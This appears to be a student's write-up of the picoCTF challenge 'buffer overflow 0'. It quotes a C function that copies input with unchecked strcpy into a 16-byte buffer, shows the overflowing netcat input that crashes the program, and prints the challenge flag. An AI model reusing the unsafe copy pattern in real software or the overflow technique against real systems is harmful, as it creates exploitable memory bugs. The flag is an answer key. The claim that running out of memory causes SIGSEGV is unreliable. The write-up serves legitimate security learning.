# buffer overflow 0
> Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Additional details will be available after launching your challenge instance.


## Solution:

- connecting nc and running the program doesnt give much information
```
aditya@Dell-Inspiron:~$ nc saturn.picoctf.net 55374
Input: 111
The program will exit now
```
- taking a look at the source code reveals that
```
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```
- buf2 size is only 16 bytes
- The program uses strcpy to copy input user to buf2
- So, if we input more than 16 bytes then it will overwrite into other parts of the memory
- This causes the program to crash, triggering the sigsegv_handler and printing the flag.

```
aditya@Dell-Inspiron:~$ nc saturn.picoctf.net 58075
Input: 111111111111111111111111111111111111111111111111111111111111111111111
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```


## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Concepts learnt:
- how overwriting a buffer corrupts nearby memory 
- When a program runs out of memory, it leads to a SIGSEGV error

## Notes:

- I forgot what strcpy did and looked it up... and I also found my hint there (risc of overflow) :) 


## Resources:

- (https://www.geeksforgeeks.org/c/strcpy-in-c/)
- (https://phoenixnap.com/kb/sigsegv)


***
